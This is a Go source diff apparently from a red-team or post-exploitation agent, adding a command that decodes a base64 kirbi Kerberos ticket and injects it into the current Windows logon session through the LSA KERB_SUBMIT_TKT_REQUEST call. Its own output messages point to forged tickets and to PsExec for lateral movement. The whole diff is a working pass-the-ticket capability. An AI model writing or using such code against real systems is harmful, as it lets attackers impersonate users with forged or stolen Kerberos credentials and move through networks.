@@ -29,6 +29,7 @@ const (
 	kerbQueryTicketCacheExMessage    = 14
 	kerbRetrieveEncodedTicketMessage = 8
 	kerbPurgeTicketCacheMessage      = 7
+	kerbSubmitTicketMessage          = 21
 
 	kerbRetrieveTicketAsKerbCred = 8
 )
@@ -506,6 +507,142 @@ func klistDump(args klistArgs) structs.CommandResult {
 		sb.WriteString(kirbiB64[i:end])
 		sb.WriteString("\n")
 	}
+
+	return structs.CommandResult{
+		Output:    sb.String(),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+func klistImport(args klistArgs) structs.CommandResult {
+	if args.Ticket == "" {
+		return structs.CommandResult{
+			Output:    "Error: -ticket parameter required (base64-encoded kirbi data)",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Decode base64
+	data, err := base64.StdEncoding.DecodeString(args.Ticket)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error decoding base64 ticket data: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	if len(data) < 4 {
+		return structs.CommandResult{
+			Output:    "Error: ticket data too short",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Auto-detect format
+	isCcache := (data[0] == 0x05 && (data[1] == 0x03 || data[1] == 0x04))
+	isKirbi := data[0] == 0x76
+
+	if !isCcache && !isKirbi {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: unrecognized ticket format (first byte: 0x%02x). Expected kirbi (0x76) or ccache (0x0503/0x0504).", data[0]),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	if isCcache {
+		return structs.CommandResult{
+			Output:    "Error: ccache format detected. On Windows, use kirbi format instead.\nRe-forge with: ticket -action forge ... -format kirbi\nOr use impacket's ticketConverter.py to convert.",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Connect to LSA
+	handle, err := lsaConnect()
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error connecting to LSA: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	defer lsaClose(handle)
+
+	authPkg, err := lsaLookupKerberos(handle)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error looking up Kerberos package: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Build KERB_SUBMIT_TKT_REQUEST:
+	//   MessageType    uint32  (offset 0)
+	//   LogonIdLow     uint32  (offset 4)
+	//   LogonIdHigh    int32   (offset 8)
+	//   Flags          uint32  (offset 12)
+	//   Key: KERB_CRYPTO_KEY32 { KeyType int32(4), Length uint32(4), Value *byte(8) } = 16 bytes (offset 16)
+	//   KerbCredSize   uint32  (offset 32)
+	//   KerbCredOffset uint32  (offset 36)
+	// Total header = 40 bytes, then kirbi data follows inline
+
+	headerSize := uint32(40)
+	totalSize := headerSize + uint32(len(data))
+	buf := make([]byte, totalSize)
+
+	// MessageType = KERB_SUBMIT_TKT_REQUEST (21)
+	*(*uint32)(unsafe.Pointer(&buf[0])) = kerbSubmitTicketMessage
+	// LogonId = 0, Flags = 0, Key = zero (no additional key)
+	// KerbCredSize
+	*(*uint32)(unsafe.Pointer(&buf[32])) = uint32(len(data))
+	// KerbCredOffset — offset from start of struct
+	*(*uint32)(unsafe.Pointer(&buf[36])) = headerSize
+
+	// Copy kirbi data after header
+	copy(buf[headerSize:], data)
+
+	var responsePtr uintptr
+	var responseLen uint32
+	var protocolStatus uintptr
+
+	ret, _, _ := procLsaCallAuthenticationPkg.Call(
+		handle,
+		uintptr(authPkg),
+		uintptr(unsafe.Pointer(&buf[0])),
+		uintptr(totalSize),
+		uintptr(unsafe.Pointer(&responsePtr)),
+		uintptr(unsafe.Pointer(&responseLen)),
+		uintptr(unsafe.Pointer(&protocolStatus)),
+	)
+	if responsePtr != 0 {
+		defer procLsaFreeReturnBuffer.Call(responsePtr)
+	}
+	if ret != 0 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error submitting ticket to LSA: %v", lsaNtStatusToError(ret)),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+	if protocolStatus != 0 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Kerberos submit error: %v", lsaNtStatusToError(protocolStatus)),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("[+] Ticket imported successfully (kirbi, %d bytes)\n", len(data)))
+	sb.WriteString("[+] Injected into current logon session's Kerberos ticket cache via LSA\n")
+	sb.WriteString("\n[*] Verify with: klist -action list\n")
+	sb.WriteString("[*] The ticket is now available for Kerberos authentication (e.g., net use, PsExec, etc.)")
 
 	return structs.CommandResult{
 		Output:    sb.String(),
